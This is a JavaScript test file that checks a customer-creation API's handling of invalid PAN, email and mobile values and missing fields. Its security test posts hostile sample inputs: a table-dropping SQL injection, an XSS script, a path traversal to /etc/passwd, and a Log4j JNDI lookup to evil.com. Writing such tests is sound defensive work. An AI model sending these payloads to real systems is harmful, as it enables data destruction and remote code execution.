// Edge case testing - Invalid inputs
import { createAuthenticatedClient, generateTestId, formatTestResult } from '../utils/test-helpers.js'
import { cleanupSpecificTestData } from '../utils/cleanup.js'
import { TEST_CONFIG } from '../config.js'

/**
 * Test invalid PAN formats
 */
export async function testInvalidPAN() {
  console.log('[Edge Case] Testing invalid PAN formats...')
  const testId = generateTestId('INV_PAN')
  const results = []
  
  try {
    const client = await createAuthenticatedClient(TEST_CONFIG.TEST_ADMIN)
    
    const invalidPANs = [
      { pan: 'ABCD1234F', reason: 'Too short' },
      { pan: 'ABCDE12345F', reason: 'Too long' },
      { pan: '12345ABCDE', reason: 'Wrong format' },
      { pan: 'ABCDE1234', reason: 'Missing last letter' },
      { pan: 'ABCDE1234f', reason: 'Lowercase last letter' },
      { pan: 'abcde1234f', reason: 'All lowercase' },
      { pan: '', reason: 'Empty' },
      { pan: 'ABCDE1234F', reason: 'Valid (should pass)' }
    ]
    
    for (const testCase of invalidPANs) {
      const customerData = {
        name: `${TEST_CONFIG.TEST_PREFIX.CUSTOMER}${testId}_${testCase.reason.replace(/\s/g, '_')}`,
        investor_id: parseInt(`999${Date.now()}${Math.random()}`),
        pan: testCase.pan,
        email: `pantest@example.com`,
        mobile: '9876543210',
        address1: 'PAN Test Address',
        city: 'Test City',
        state: 'Test State',
        pin_code: '123456',
        relationship_manager: 'HO'
      }
      
      try {
        const response = await client.post('/api/customers', customerData)
        const shouldPass = testCase.reason === 'Valid (should pass)'
        const passed = shouldPass ? response.status === 201 : false
        
        results.push({
          pan: testCase.pan,
          reason: testCase.reason,
          passed,
          expectedFailure: !shouldPass,
          status: response.status
        })
        
        // Cleanup if created
        if (response.data && response.data.id) {
          await cleanupSpecificTestData('customer', response.data.id)
        }
      } catch (error) {
        const shouldPass = testCase.reason === 'Valid (should pass)'
        const passed = shouldPass ? false : true
        
        results.push({
          pan: testCase.pan,
          reason: testCase.reason,
          passed,
          expectedFailure: !shouldPass,
          status: error.response?.status || 0
        })
      }
    }
    
    const allPassed = results.every(r => r.passed)
    
    return formatTestResult(
      'Edge Case - Invalid PAN Formats',
      allPassed,
      0,
      { testCases: results }
    )
  } catch (error) {
    return formatTestResult(
      'Edge Case - Invalid PAN Formats',
      false,
      0,
      { error: error.message }
    )
  }
}

/**
 * Test invalid email formats
 */
export async function testInvalidEmail() {
  console.log('[Edge Case] Testing invalid email formats...')
  const testId = generateTestId('INV_EMAIL')
  const results = []
  
  try {
    const client = await createAuthenticatedClient(TEST_CONFIG.TEST_ADMIN)
    
    const invalidEmails = [
      { email: 'invalid', reason: 'No @ symbol' },
      { email: 'invalid@', reason: 'No domain' },
      { email: '@example.com', reason: 'No username' },
      { email: 'invalid@example', reason: 'No TLD' },
      { email: 'invalid..test@example.com', reason: 'Double dots' },
      { email: 'invalid@example..com', reason: 'Double dots in domain' },
      { email: 'invalid@example.com', reason: 'Valid (should pass)' }
    ]
    
    for (const testCase of invalidEmails) {
      const customerData = {
        name: `${TEST_CONFIG.TEST_PREFIX.CUSTOMER}${testId}_${testCase.reason.replace(/\s/g, '_')}`,
        investor_id: parseInt(`999${Date.now()}${Math.random()}`),
        pan: 'ABCDE1234F',
        email: testCase.email,
        mobile: '9876543210',
        address1: 'Email Test Address',
        city: 'Test City',
        state: 'Test State',
        pin_code: '123456',
        relationship_manager: 'HO'
      }
      
      try {
        const response = await client.post('/api/customers', customerData)
        const shouldPass = testCase.reason === 'Valid (should pass)'
        const passed = shouldPass ? response.status === 201 : false
        
        results.push({
          email: testCase.email,
          reason: testCase.reason,
          passed,
          expectedFailure: !shouldPass,
          status: response.status
        })
        
        // Cleanup if created
        if (response.data && response.data.id) {
          await cleanupSpecificTestData('customer', response.data.id)
        }
      } catch (error) {
        const shouldPass = testCase.reason === 'Valid (should pass)'
        const passed = shouldPass ? false : true
        
        results.push({
          email: testCase.email,
          reason: testCase.reason,
          passed,
          expectedFailure: !shouldPass,
          status: error.response?.status || 0
        })
      }
    }
    
    const allPassed = results.every(r => r.passed)
    
    return formatTestResult(
      'Edge Case - Invalid Email Formats',
      allPassed,
      0,
      { testCases: results }
    )
  } catch (error) {
    return formatTestResult(
      'Edge Case - Invalid Email Formats',
      false,
      0,
      { error: error.message }
    )
  }
}

/**
 * Test invalid mobile numbers
 */
export async function testInvalidMobile() {
  console.log('[Edge Case] Testing invalid mobile numbers...')
  const testId = generateTestId('INV_MOBILE')
  const results = []
  
  try {
    const client = await createAuthenticatedClient(TEST_CONFIG.TEST_ADMIN)
    
    const invalidMobiles = [
      { mobile: '1234567890', reason: 'Does not start with 6-9' },
      { mobile: '987654321', reason: 'Too short' },
      { mobile: '98765432101', reason: 'Too long' },
      { mobile: '987654321a', reason: 'Contains letters' },
      { mobile: '', reason: 'Empty' },
      { mobile: '9876543210', reason: 'Valid (should pass)' }
    ]
    
    for (const testCase of invalidMobiles) {
      const customerData = {
        name: `${TEST_CONFIG.TEST_PREFIX.CUSTOMER}${testId}_${testCase.reason.replace(/\s/g, '_')}`,
        investor_id: parseInt(`999${Date.now()}${Math.random()}`),
        pan: 'ABCDE1234F',
        email: `mobiletest@example.com`,
        mobile: testCase.mobile,
        address1: 'Mobile Test Address',
        city: 'Test City',
        state: 'Test State',
        pin_code: '123456',
        relationship_manager: 'HO'
      }
      
      try {
        const response = await client.post('/api/customers', customerData)
        const shouldPass = testCase.reason === 'Valid (should pass)'
        const passed = shouldPass ? response.status === 201 : false
        
        results.push({
          mobile: testCase.mobile,
          reason: testCase.reason,
          passed,
          expectedFailure: !shouldPass,
          status: response.status
        })
        
        // Cleanup if created
        if (response.data && response.data.id) {
          await cleanupSpecificTestData('customer', response.data.id)
        }
      } catch (error) {
        const shouldPass = testCase.reason === 'Valid (should pass)'
        const passed = shouldPass ? false : true
        
        results.push({
          mobile: testCase.mobile,
          reason: testCase.reason,
          passed,
          expectedFailure: !shouldPass,
          status: error.response?.status || 0
        })
      }
    }
    
    const allPassed = results.every(r => r.passed)
    
    return formatTestResult(
      'Edge Case - Invalid Mobile Numbers',
      allPassed,
      0,
      { testCases: results }
    )
  } catch (error) {
    return formatTestResult(
      'Edge Case - Invalid Mobile Numbers',
      false,
      0,
      { error: error.message }
    )
  }
}

/**
 * Test missing required fields
 */
export async function testMissingRequiredFields() {
  console.log('[Edge Case] Testing missing required fields...')
  const testId = generateTestId('MISS_REQ')
  const results = []
  
  try {
    const client = await createAuthenticatedClient(TEST_CONFIG.TEST_ADMIN)
    
    const requiredFields = ['name', 'investor_id', 'pan', 'mobile']
    
    for (const field of requiredFields) {
      const customerData = {
        name: `${TEST_CONFIG.TEST_PREFIX.CUSTOMER}${testId}`,
        investor_id: parseInt(`999${Date.now()}`),
        pan: 'ABCDE1234F',
        email: `reqtest@example.com`,
        mobile: '9876543210',
        address1: 'Required Test Address',
        city: 'Test City',
        state: 'Test State',
        pin_code: '123456',
        relationship_manager: 'HO'
      }
      
      // Remove the required field
      delete customerData[field]
      
      try {
        const response = await client.post('/api/customers', customerData)
        // Should fail
        results.push({
          missingField: field,
          passed: false,
          expectedFailure: true,
          status: response.status
        })
      } catch (error) {
        // Expected to fail
        results.push({
          missingField: field,
          passed: error.response?.status === 400,
          expectedFailure: true,
          status: error.response?.status || 0
        })
      }
    }
    
    const allPassed = results.every(r => r.passed)
    
    return formatTestResult(
      'Edge Case - Missing Required Fields',
      allPassed,
      0,
      { testCases: results }
    )
  } catch (error) {
    return formatTestResult(
      'Edge Case - Missing Required Fields',
      false,
      0,
      { error: error.message }
    )
  }
}

/**
 * Test SQL injection and XSS attempts
 */
export async function testSecurityInputs() {
  console.log('[Edge Case] Testing security inputs (SQL injection, XSS)...')
  const testId = generateTestId('SEC_INPUT')
  const results = []
  
  try {
    const client = await createAuthenticatedClient(TEST_CONFIG.TEST_ADMIN)
    
    const securityInputs = [
      { input: "'; DROP TABLE customers; --", type: 'SQL Injection' },
      { input: '<script>alert("XSS")</script>', type: 'XSS' },
      { input: '../../etc/passwd', type: 'Path Traversal' },
      { input: '${jndi:ldap://evil.com/a}', type: 'Log4j' },
      { input: 'Normal Input', type: 'Normal (should pass)' }
    ]
    
    for (const testCase of securityInputs) {
      const customerData = {
        name: `${TEST_CONFIG.TEST_PREFIX.CUSTOMER}${testId}_${testCase.type.replace(/\s/g, '_')}`,
        investor_id: parseInt(`999${Date.now()}${Math.random()}`),
        pan: 'ABCDE1234F',
        email: `sectest@example.com`,
        mobile: '9876543210',
        address1: testCase.input,
        city: 'Test City',
        state: 'Test State',
        pin_code: '123456',
        relationship_manager: 'HO'
      }
      
      try {
        const response = await client.post('/api/customers', customerData)
        const shouldPass = testCase.type === 'Normal (should pass)'
        const passed = shouldPass ? response.status === 201 : response.status === 201 // May pass if sanitized
        
        results.push({
          input: testCase.input.substring(0, 30),
          type: testCase.type,
          passed,
          status: response.status
        })
        
        // Cleanup if created
        if (response.data && response.data.id) {
          await cleanupSpecificTestData('customer', response.data.id)
        }
      } catch (error) {
        const shouldPass = testCase.type === 'Normal (should pass)'
        const passed = shouldPass ? false : true
        
        results.push({
          input: testCase.input.substring(0, 30),
          type: testCase.type,
          passed,
          status: error.response?.status || 0
        })
      }
    }
    
    const allPassed = results.every(r => r.passed)
    
    return formatTestResult(
      'Edge Case - Security Inputs',
      allPassed,
      0,
      { testCases: results }
    )
  } catch (error) {
    return formatTestResult(
      'Edge Case - Security Inputs',
      false,
      0,
      { error: error.message }
    )
  }
}

/**
 * Run all invalid input tests
 */
export async function runAllInvalidInputTests() {
  console.log('='.repeat(60))
  console.log('EDGE CASE TESTING - INVALID INPUTS')
  console.log('='.repeat(60))
  
  const results = []
  
  results.push(await testInvalidPAN())
  results.push(await testInvalidEmail())
  results.push(await testInvalidMobile())
  results.push(await testMissingRequiredFields())
  results.push(await testSecurityInputs())
  
  return results
}

